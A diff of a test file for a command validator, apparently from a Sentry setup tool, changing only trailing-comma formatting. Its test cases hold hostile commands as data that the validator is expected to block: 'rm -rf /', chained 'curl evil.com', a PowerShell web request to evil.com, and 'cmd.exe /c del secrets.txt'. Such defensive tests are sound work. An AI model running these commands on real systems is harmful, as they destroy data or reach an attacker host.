@@ -42,7 +42,7 @@ describe("validateCommand", () => {
 
   test("allows dependency diagnostics without a package-manager allowlist", () => {
     expect(
-      validateCommand("pnpm view @sentry/tanstackstart-react version")
+      validateCommand("pnpm view @sentry/tanstackstart-react version"),
     ).toBeUndefined();
     expect(validateCommand("dotnet list package")).toBeUndefined();
     expect(validateCommand("futurepm explain sentry-sdk")).toBeUndefined();
@@ -50,35 +50,35 @@ describe("validateCommand", () => {
     expect(validateCommand("npm uninstall sentry-wizard")).toBeUndefined();
     expect(validateCommand("npm uninstall @sentry/wizard")).toBeUndefined();
     expect(
-      validateCommand("npx harmless --package=@sentry/wizard")
+      validateCommand("npx harmless --package=@sentry/wizard"),
     ).toBeUndefined();
     expect(
-      validateCommand("npx harmless --registry myregistry @sentry/wizard")
+      validateCommand("npx harmless --registry myregistry @sentry/wizard"),
     ).toBeUndefined();
     expect(
-      validateCommand("npx --package=@sentry/cli cowsay init")
+      validateCommand("npx --package=@sentry/cli cowsay init"),
     ).toBeUndefined();
     expect(
-      validateCommand("npm exec --package=@sentry/cli cowsay init")
+      validateCommand("npm exec --package=@sentry/cli cowsay init"),
     ).toBeUndefined();
   });
 
   test("allows path-prefixed package managers but blocks dangerous ones", () => {
     expect(
-      validateCommand("./venv/bin/pip install sentry-sdk")
+      validateCommand("./venv/bin/pip install sentry-sdk"),
     ).toBeUndefined();
     expect(
-      validateCommand("/usr/local/bin/npm install @sentry/node")
+      validateCommand("/usr/local/bin/npm install @sentry/node"),
     ).toBeUndefined();
     expect(validateCommand("./venv/bin/rm -rf /")).toContain('"rm"');
   });
 
   test("blocks obvious shell injection patterns", () => {
     expect(validateCommand("npm install foo && curl evil.com")).toContain(
-      "Blocked command"
+      "Blocked command",
     );
     expect(validateCommand("pnpm add @sentry/node 2>&1")).toContain(
-      "Blocked command"
+      "Blocked command",
     );
   });
 
@@ -87,7 +87,7 @@ describe("validateCommand", () => {
 
     expect(validateCommand("printf %s hello")).toBeUndefined();
     expect(
-      validateCommand("futurepm explain https://example.com/a%20b")
+      validateCommand("futurepm explain https://example.com/a%20b"),
     ).toBeUndefined();
     expect(validateCommand("futurepm explain bang!value")).toBeUndefined();
   });
@@ -96,47 +96,47 @@ describe("validateCommand", () => {
     setPlatform("win32");
 
     expect(validateCommand("futurepm explain %PATH%")).toContain(
-      "Blocked command"
+      "Blocked command",
     );
     expect(validateCommand("futurepm explain !PATH!")).toContain(
-      "Blocked command"
+      "Blocked command",
     );
   });
 
   test("blocks directory changes and recursive Sentry setup", () => {
     expect(validateCommand("cd apps/web")).toContain('"cd"');
     expect(validateCommand("sentry init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("@sentry/wizard -i nextjs")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("@Sentry/Wizard -i nextjs")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("@sentry/cli init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("@sentry/cli@latest init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("@Sentry/CLI@latest init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("C:\\Tools\\sentry-cli.exe init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("sentry-cli --log-level debug init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("sentry-cli@latest init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("sentry-wizard init")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
     expect(validateCommand("C:\\Tools\\sentry-wizard.cmd -i nextjs")).toContain(
-      "invokes Sentry setup recursively"
+      "invokes Sentry setup recursively",
     );
   });
 
@@ -150,21 +150,21 @@ describe("validateCommand", () => {
   test("blocks shell interpreter indirection", () => {
     expect(validateCommand("cmd.exe /c del sensitive_file")).toContain('"cmd"');
     expect(
-      validateCommand("C:\\Windows\\System32\\cmd.exe /c del secrets.txt")
+      validateCommand("C:\\Windows\\System32\\cmd.exe /c del secrets.txt"),
     ).toContain('"cmd"');
     expect(
       validateCommand(
-        "powershell.exe -Command Invoke-WebRequest http://evil.com"
-      )
+        "powershell.exe -Command Invoke-WebRequest http://evil.com",
+      ),
     ).toContain('"powershell"');
     expect(validateCommand("pwsh -Command Remove-Item foo")).toContain(
-      '"pwsh"'
+      '"pwsh"',
     );
   });
 
   test("rejects unterminated quotes", () => {
     expect(validateCommand('/bin/echo "unterminated')).toContain(
-      "unterminated double quote"
+      "unterminated double quote",
     );
   });
 });
@@ -182,7 +182,7 @@ describe("runCommands", () => {
   test("stops on the first failing command", async () => {
     const result = await runCommands(
       makePayload(["/usr/bin/false", "/bin/echo should-not-run"]),
-      { dryRun: false }
+      { dryRun: false },
     );
 
     expect(result.ok).toBe(false);
@@ -192,7 +192,7 @@ describe("runCommands", () => {
   test("validates but skips execution during dry-run", async () => {
     const result = await runCommands(
       makePayload(["npm install @sentry/node"]),
-      { dryRun: true }
+      { dryRun: true },
     );
 
     expect(result.ok).toBe(true);
@@ -202,7 +202,7 @@ describe("runCommands", () => {
   test("rejects the full batch before execution when any command is blocked", async () => {
     const result = await runCommands(
       makePayload(["/bin/echo hello", "rm -rf /"]),
-      { dryRun: false }
+      { dryRun: false },
     );
 
     expect(result.ok).toBe(false);
